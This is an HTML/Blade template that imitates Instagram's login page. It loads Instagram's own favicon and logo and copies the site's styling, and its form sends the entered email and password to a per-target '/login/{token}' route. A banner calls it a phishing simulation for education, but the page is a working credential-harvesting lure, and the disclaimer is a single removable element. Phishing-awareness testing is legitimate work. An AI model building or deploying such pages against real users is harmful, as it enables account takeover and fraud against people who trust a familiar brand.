<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v3/yI/r/VsNE-OHk_8a.png">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; 
            background-color: #fafafa; 
            display: flex; 
            flex-direction: column; 
            align-items: center; 
            justify-content: center; 
            min-height: 100vh; 
            color: #262626; 
        }
        .container { 
            width: 350px; 
            margin: 0 auto; 
        }
        .phone-mockup { 
            display: none; 
        }
        .auth-form { 
            background-color: #fff; 
            border: 1px solid #dbdbdb; 
            border-radius: 1px; 
            margin: 0 0 10px; 
            padding: 10px 0; 
            text-align: center; 
        }
        .logo { 
            background-image: url('https://static.cdninstagram.com/rsrc.php/v3/yM/r/8n91YnfPq0s.png'); 
            background-repeat: no-repeat; 
            background-position: 0 -130px; 
            height: 51px; 
            width: 175px; 
            margin: 22px auto 12px; 
        }
        .form { 
            display: flex; 
            flex-direction: column; 
            margin-bottom: 10px; 
            padding: 0 40px; 
        }
        .form-input { 
            background: #fafafa; 
            border: 1px solid #dbdbdb; 
            border-radius: 3px; 
            font-size: 12px; 
            height: 36px; 
            margin: 0 0 6px; 
            outline: 0; 
            overflow: hidden; 
            padding: 9px 0 7px 8px; 
            text-overflow: ellipsis; 
            width: 100%; 
        }
        .form-input:focus { 
            border-color: #a8a8a8; 
        }
        .form-button { 
            background: #0095f6; 
            border: 1px solid transparent; 
            border-radius: 4px; 
            color: #fff; 
            cursor: pointer; 
            font-size: 14px; 
            font-weight: 600; 
            height: 30px; 
            margin: 8px 0; 
            outline: 0; 
            overflow: hidden; 
            padding: 5px 9px; 
            text-align: center; 
            text-overflow: ellipsis; 
            width: 100%; 
        }
        .form-button:hover { 
            background: #1877f2; 
        }
        .divider { 
            color: #8e8e8e; 
            font-size: 13px; 
            font-weight: 600; 
            line-height: 15px; 
            margin: 10px 40px 18px; 
            text-align: center; 
            text-transform: uppercase; 
        }
        .divider::before, 
        .divider::after { 
            background-color: #dbdbdb; 
            content: ''; 
            height: 1px; 
            position: relative; 
            top: .45em; 
            width: 43%; 
        }
        .divider::before { 
            float: left; 
        }
        .divider::after { 
            float: right; 
        }
        .facebook-login { 
            color: #385185; 
            font-size: 14px; 
            font-weight: 600; 
            line-height: 18px; 
            margin: 8px 40px 14px; 
            text-align: center; 
            text-decoration: none; 
        }
        .forgot-password { 
            font-size: 12px; 
            line-height: 14px; 
            margin-top: 12px; 
            text-align: center; 
        }
        .forgot-password a { 
            color: #385185; 
            text-decoration: none; 
        }
        .signup-box { 
            background-color: #fff; 
            border: 1px solid #dbdbdb; 
            border-radius: 1px; 
            color: #262626; 
            font-size: 14px; 
            margin: 10px 0; 
            padding: 10px 0; 
            text-align: center; 
        }
        .signup-box a { 
            color: #0095f6; 
            font-weight: 600; 
            text-decoration: none; 
        }
        .disclaimer { 
            position: fixed; 
            bottom: 10px; 
            left: 50%; 
            transform: translateX(-50%); 
            background: rgba(255, 0, 0, 0.9); 
            color: white; 
            padding: 8px 16px; 
            border-radius: 4px; 
            font-size: 12px; 
            z-index: 1000; 
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="auth-form">
            <div class="logo"></div>
            <form method="POST" action="{{ url('/login/' . $token) }}" class="form">
                @csrf
                <input type="text" name="email" class="form-input" placeholder="Phone number, username, or email" required>
                <input type="password" name="password" class="form-input" placeholder="Password" required>
                <button type="submit" class="form-button">Log In</button>
            </form>
            <div class="divider">or</div>
            <a href="#" class="facebook-login">Log in with Facebook</a>
            <div class="forgot-password">
                <a href="#">Forgot password?</a>
            </div>
        </div>
        <div class="signup-box">
            Don't have an account? <a href="#">Sign up</a>
        </div>
    </div>
    <div class="disclaimer">
        ⚠️ This is a phishing simulation for educational purposes. Do not use real credentials.
    </div>
</body>
</html>
